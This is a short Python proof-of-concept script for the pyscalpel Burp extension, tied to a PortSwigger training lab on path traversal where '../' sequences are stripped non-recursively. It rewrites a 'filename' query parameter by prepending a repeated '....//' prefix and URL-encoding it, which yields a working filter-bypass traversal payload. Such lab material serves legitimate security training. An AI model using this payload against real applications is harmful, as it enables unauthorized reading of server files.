from pyscalpel.http import Request
from pyscalpel.utils import urldecode, urlencode_all

# POC script for path traversal exploitation
# -> https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively

PARAM_NAME = "filename"

PREFIX = b"....//" * 500


def req_edit_in(req: Request) -> bytes | None:
    param = req.query[PARAM_NAME]
    if param is not None:
        text_bytes = param.encode()
        return urldecode(text_bytes).removeprefix(PREFIX)


def req_edit_out(req: Request, text: bytes) -> Request | None:
    encoded = urlencode_all(PREFIX + text)
    str_encoded = str(encoded, "ascii")
    req.query[PARAM_NAME] = str_encoded
    return req
